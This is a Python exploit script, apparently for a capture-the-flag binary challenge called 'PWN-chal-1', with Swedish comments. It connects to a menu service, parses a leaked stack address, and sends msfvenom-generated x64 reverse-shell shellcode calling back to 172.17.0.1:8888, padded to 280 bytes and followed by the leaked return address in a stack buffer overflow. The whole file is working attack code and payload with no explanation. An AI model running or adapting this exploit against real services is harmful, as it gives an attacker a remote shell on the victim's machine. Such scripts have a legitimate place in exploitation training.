# Exploit script for PWN-chal-1
# Rewrite in bash...
# 0x7ffcfbda97f0
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.17.0.1 LPORT=8888 --platform linux -a x64 -b "\x00" -f python
import socket
import struct
import sys
import time

def sendrecieve(socket, buffer):
    socket.send(buffer)
    time.sleep(0.2)
    result = socket.recv(1024)
    print(result)
    return result

def retrieveaddress(buffer):
    buffer = str(buffer)
    buffer = buffer.replace("\\n1. Logga in med l\\xc3\\xb6senord\\n2. H\\xc3\\xa4mta tid\\n3. Byt Autentiseringsmetod\\n4. Exit\\n", "")
    returnval = buffer
    returnval = buffer.replace("b'ERROR IN ERROR: 0x", "")
    returnval = returnval.replace("\\n\\n1. Logga in med l\\xc3\\xb6senord\\r\\n2. H\\xc3\\xa4mta tid\\r\\n3. Byt Autentiseringsmetod\\r\\n4. Exit\\r\\n'", "")
    returnval = returnval.replace("\\n'", "")
    return returnval

# hur fan tänkte jag här?
def getaddress(address):
    address = struct.pack("<Q", int(address, 16))
    address = address[0:6]
    return address
        

if len(sys.argv) != 3:
	print(f"Usage: {sys.argv[0]} IP PORT")
	sys.exit(-1)

HOST = sys.argv[1]
PORT = int(sys.argv[2])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))

s.settimeout(5.0)

res = s.recv(1024)
print(res)

# Retrieve the address leak
buf = b"\x33\x00"
result = sendrecieve(s, buf)

print("\n")
address = getaddress(retrieveaddress(result))
print(address)


buf = b"\x31\x00"
res = sendrecieve(s, buf)

input("send badchars")


# Bad chars
# 00


buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\x20\x16\x74\x25\xa6"
buf += b"\xe0\x25\xa6\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x4a\x3f\x2c\xbc\xcc\xe2\x7a\xcc\x21"
buf += b"\x48\x7b\x20\xee\x77\x6d\x1f\x22\x16\x56\x9d\xf7"
buf += b"\x4a\x94\x91\x71\x5e\xfd\xc3\xcc\xf0\x7f\xcc\x0a"
buf += b"\x4e\x7b\x20\xcc\xe3\x7b\xee\xdf\xd8\x1e\x04\xfe"
buf += b"\xef\x20\xd3\xd6\x7c\x4f\x7d\x3f\xa8\x9e\x89\x42"
buf += b"\x7f\x1a\x0a\xd5\x88\x25\xf5\x68\x9f\x93\x77\xf1"
buf += b"\xa8\xac\x40\x2f\x13\x74\x25\xa6\xe0\x25\xa6"

buffer = b"\x41" * (280 - len(buf))

payload = buf + buffer + address + b"\x00"

print(payload)
input()
res = sendrecieve(s, payload)

input("exit")
buf = b"\x34\x00"
s.send(buf)

s.close()
